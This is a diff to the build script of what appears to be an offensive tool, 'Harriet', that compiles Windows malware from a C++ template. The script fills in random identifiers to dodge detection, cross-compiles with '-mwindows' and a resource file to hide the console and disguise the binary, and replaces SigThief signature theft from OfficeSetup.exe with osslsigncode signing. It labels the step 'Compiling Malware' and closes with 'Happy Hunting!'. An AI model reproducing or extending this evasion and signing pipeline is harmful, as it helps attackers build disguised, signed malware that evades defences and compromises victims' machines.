@@ -74,7 +74,7 @@ cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > shell.txt
 Random3=$(cat shell.txt)
 sed -i "s/Random3/$Random3/g" Harriet/NativeAPI/Resources/template.cpp
 
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-16} | head -n 1 > shell.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-10} | head -n 1 > shell.txt
 Random4=$(cat shell.txt)
 sed -i "s/Random4/$Random4/g" Harriet/NativeAPI/Resources/template.cpp
 
@@ -99,11 +99,8 @@ cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > shell.txt
 Random9=$(cat shell.txt)
 sed -i "s/Random9/$Random9/g" Harriet/NativeAPI/Resources/template.cpp
 
-
-
-
 echo -e ${yellow}"+++Compiling Malware+++"${clear}
-x86_64-w64-mingw32-g++ -o $MALWARE Harriet/NativeAPI/Resources/template.cpp -fpermissive -Wno-narrowing -O2>/dev/null 2>&1
+x86_64-w64-mingw32-g++ -o $MALWARE Harriet/NativeAPI/Resources/template.cpp -fpermissive -Wno-narrowing Harriet/Resources/resources.res -mwindows -O2 >/dev/null 2>&1
 echo ""
 sleep 2
 rm shell*
@@ -113,7 +110,32 @@ sleep 2
 echo -e ${yellow}"+++Adding Binary Signature+++"${clear}
 echo ""
 sleep 2
-python3 Harriet/Resources/SigThief/sigthief.py -i Harriet/Resources/OfficeSetup.exe -t $MALWARE -o signed$MALWARE >/dev/null 2>&1
+# Set static paths for certificate, private key, executable, and signed output
+CERTIFICATE_PATH="Harriet/Resources/certificate.pem"
+KEY_PATH="Harriet/Resources/private_key.pem"
+
+
+# Check if osslsigncode is installed
+if ! command -v osslsigncode &> /dev/null; then
+    echo "Error: osslsigncode is not installed. Please install it first."
+    exit 1
+fi
+
+# Check if the certificate and key files exist
+if [ ! -f "$CERTIFICATE_PATH" ] || [ ! -f "$KEY_PATH" ]; then
+    echo "Error: Certificate or private key file not found."
+    exit 1
+fi
+
+# Check if the executable file exists
+if [ ! -f "$MALWARE" ]; then
+    echo "Error: Executable file not found."
+    exit 1
+fi
+
+# Sign the executable using osslsigncode
+osslsigncode sign -certs "$CERTIFICATE_PATH" -key "$KEY_PATH" -in "$MALWARE" -out "signed$MALWARE" >/dev/null 2>&1
+
 mv signed$MALWARE $MALWARE
 echo -e ${yellow}"***Signature Added. Happy Hunting!**"${clear}
 echo ""
